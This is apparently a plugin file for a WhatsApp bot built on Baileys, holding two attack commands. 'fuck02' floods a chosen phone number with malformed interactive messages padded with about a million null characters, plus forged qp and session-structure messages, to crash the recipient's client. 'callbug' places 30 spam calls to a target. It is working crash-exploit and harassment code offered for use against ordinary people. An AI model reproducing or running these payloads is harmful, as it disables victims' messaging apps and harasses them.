const { cmd, commands } = require("../lib/command");
const { getBuffer, getGroupAdmins, getRandom, h2k, isUrl, Json, runtime, sleep, fetchJson, jsonformat } = require("../lib/functions");
const {
    default: makeWASocket,
    generateWAMessageFromContent,
    proto
} = require('@whiskeysockets/baileys')


cmd({
    pattern: "fuck02",
    react: "💀",
    desc: "𝔳𝔶𝔟𝔢𝔯 𝔱𝔞𝔡𝔞𝔰𝔥𝔦 𝔬𝔣𝔠",
    category: "bug",
    use: '.fuck02 947xxxxx',
    filename: __filename
},    
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{

 if (!isMe) return reply('𝔰𝔬𝔯𝔯𝔶 𝔶𝔬𝔲 𝔞𝔯𝔢 𝔫𝔬𝔱 𝔟𝔬𝔱 𝔬𝔴𝔫𝔢𝔯...❗')   
 if(from.includes('94727319036')) return reply('*🚫 This number is protected.*\n> *Ewwwwwwwwww Ponnya මන් දන්නවා තෝ 0773742779 Number එකට Test කරනව කියලා 😂💔🥹*')
/*if(from.includes('120363026309634278@g.us') || from.includes('120363028400218278@g.us')) return reply('Sorry, I cant send locks to my developers group 🥱\nTry using it in another group!!')	*/
if (!q) return reply(`Example: ${prefix + command} 94xxxxxxxx`)

async function sendQP(target, filterName, parameters, filterResult, clientNotSupportedConfig, clauseType, clauses, filters) {
    var qpMessage = generateWAMessageFromContent(target, proto.Message.fromObject({
        'qp': {
            'filter': {
                'filterName': filterName,
                'parameters': parameters,
                'filterResult': filterResult,
                'clientNotSupportedConfig': clientNotSupportedConfig
            },
            'filterClause': {
                'clauseType': clauseType,
                'clauses': clauses,
                'filters': filters
            }
        }
    }), { userJid: target });

    await conn.relayMessage(target, qpMessage.message, { participant: { jid: target }, messageId: qpMessage.key.id });
}
		    
		async function sendSessionStructure(target, sessionVersion, localIdentityPublic, remoteIdentityPublic, rootKey, previousCounter, senderChain, receiverChains, pendingKeyExchange, pendingPreKey, remoteRegistrationId, localRegistrationId, needsRefresh, aliceBaseKey) {
    var sessionStructure = generateWAMessageFromContent(target, proto.Message.fromObject({
        'sessionStructure': {
            'sessionVersion': sessionVersion,
            'localIdentityPublic': localIdentityPublic,
            'remoteIdentityPublic': remoteIdentityPublic,
            'rootKey': rootKey,
            'previousCounter': previousCounter,
            'senderChain': senderChain,
            'receiverChains': receiverChains,
            'pendingKeyExchange': pendingKeyExchange,
            'pendingPreKey': pendingPreKey,
            'remoteRegistrationId': remoteRegistrationId,
            'localRegistrationId': localRegistrationId,
            'needsRefresh': needsRefresh,
            'aliceBaseKey': aliceBaseKey
        }
    }), { userJid: target });

    await conn.relayMessage(target, sessionStructure.message, { participant: { jid: target }, messageId: sessionStructure.key.id });
}


  const wanted = {
            key: {
                remoteJid: 'p',
                fromMe: false,
                participant: '0@s.whatsapp.net'
            },
            message: {
                "interactiveResponseMessage": {
                    "body": {
                        "text": "Sent",
                        "format": "DEFAULT"
                    },
                    "nativeFlowResponseMessage": {
                        "name": "galaxy_message",
                        "paramsJson": `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"ZetExecute\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"czazxvoid@sky.id\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(500000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                        "version": 3
                    }
                }
            }
        }	

async function bug2(conn, target) {
    for (let i = 0; i < 7; i++) {
        await conn.relayMessage(target, 
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "*‼️𝔔𝔲𝔢𝔢𝔫  𝔗𝔞𝔡𝔞𝔰𝔥𝔦 𝔐𝔬𝔡𝔷😈*",
                                format: "EXTENSIONS_1"
                            },
                            nativeFlowResponseMessage: {
                                name: 'galaxy_message',
                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@zetxcza.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                version: 3
                            }
                        }
                    }
                }
            }, 
            { participant: { jid: target } }
        );
    }
}


async function bug1(conn, target) {
    for (let i = 0; i < 7; i++) {
        await conn.relayMessage(target, 
            {
                viewOnceMessage: {
                    message: {
                        interactiveResponseMessage: {
                            body: {
                                text: "*‼️𝔑𝔫𝔲𝔪𝔟𝔢𝔯 ℑ𝔰 𝔱𝔥𝔢 𝔉𝔲𝔠𝔨𝔢𝔡😹 😈*",
                                format: "EXTENSIONS_1"
                            },
                            nativeFlowResponseMessage: {
                                name: 'galaxy_message',
                                paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"AdvanceBug\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"attacker@conntzy.com\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(1020000)}\",\"screen_0_TextInput_1\":\"\u0003\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                                version: 3
                            }
                        }
                    }
                }
            }, 
            { participant: { jid: target } }
        );
    }
}

async function bug3(conn, target, text, amount, ptcp = false) {
    await conn.relayMessage(target, 
        {
            viewOnceMessage: {
                message: {
                    interactiveResponseMessage: {
                        body: {
                            text: text,
                            format: "EXTENSIONS_1"
                        },
                        nativeFlowResponseMessage: {
                            name: 'galaxy_message',
                            paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"devorsixcore@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0000".repeat(amount)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
                            version: 3
                        }
                    }
                }
            }
        }, 
        ptcp ? { participant: { jid: target } } : {}
    );
};
  
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reply("*_Proccesing... 🦠_*")
for (let i = 0; i < 50; i++) {
await bug3(conn, target, "> 𝙿𝙾𝚆𝙴𝚁𝙳 𝙱𝚈 𝔠𝔶𝔟𝔢𝔯 𝔱𝔞𝔡𝔞𝔰𝔥𝔦 𝔪𝔬𝔡𝔷 𝙾𝙵𝙲 🫟", 1020000, ptcp = true);
sendQP(target, wanted)
await sendQP(target, wanted)
await bug2(conn, target, wanted)
await sendSessionStructure(target, wanted)
await bug1(conn, target, wanted)
}
/*reply(`『 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒😈💥 』

𝐓𝐀𝐑𝐆𝐄𝐓 : ${target}
𝐒𝐓𝐀𝐓𝐔𝐒 : 𝔉𝔲𝔠𝔨𝔢𝔡 𝔗𝔥𝔦𝔰 𝔇𝔳𝔦𝔠𝔢𝔰 

    𝐍𝐎𝐓𝐄
> Virus Sudah Terkirim, Jika Target C2 Maka Target Mengalami Delay Maker`)*/
await conn.sendMessage(from, { react: { text: `✅`, key: mek.key }}) 
} catch (e) {
reply('*Error !!*')
l(e)
}
})
  


const callSpamCommand = {
  pattern: "callbug",
  react: "📞",
  desc: "𝔗𝔯𝔶𝔬 𝔱𝔥𝔢 𝔞𝔱𝔱𝔞𝔠𝔨 𝔫𝔲𝔪𝔟𝔢𝔯💥",
  category: "bug",
  use: ".callbug 94xxxxxxxxx",
  filename: __filename
};
cmd(callSpamCommand, async (client, message, store, { from, prefix, quoted, q, sender, reply }) => {
  try {
    if (!q) {
      return reply(`📍 *Usage:* ${prefix}callbug 94xxxxxxxxx`);
    }

    let targetNumber = q.split("|")[0].replace(/[^0-9]/g, "");
    if (!targetNumber) {
      return reply("❌ Invalid number format");
    }

    const protectedNumbers = ["94773742779"];
    if (protectedNumbers.includes(targetNumber)) {
      return reply("*🚫 This number is protected.*\n> *Ewwwwwwwwww Ponnya මන් දන්නවා තෝ මගෙ Number එකට Test කරනව කියලා 😂💔🥹*");
    }

    const jid = targetNumber + "@s.whatsapp.net";
    const exists = await client.onWhatsApp(jid);
    if (!exists || exists.length === 0) {
      return reply("🚫 This number is not registered on WhatsApp.");
    }

    async function sendCall(jid) {
      try {
        await client.offerCall(jid);
        console.log("✅ Call sent to " + jid);
      } catch (err) {
        console.error("❌ Failed to send call to " + jid + ":", err);
      }
    }

    await client.sendMessage(from, {
      text: `📞 Successfully sending spam calls to @${targetNumber}\n\n😓 Please wait a moment...`,
      mentions: [jid]
    }, { quoted: message });

    await sleep(1000);

    for (let i = 0; i < 30; i++) {
      await sendCall(jid);
      await sleep(2000);
    }

    await client.sendMessage(from, {
      react: {
        text: "✅",
        key: message.key
      }
    });

  } catch (err) {
    console.error("❌ callspam error:", err);
    return reply("❌ Error occurred while processing the callspam.");
  }
});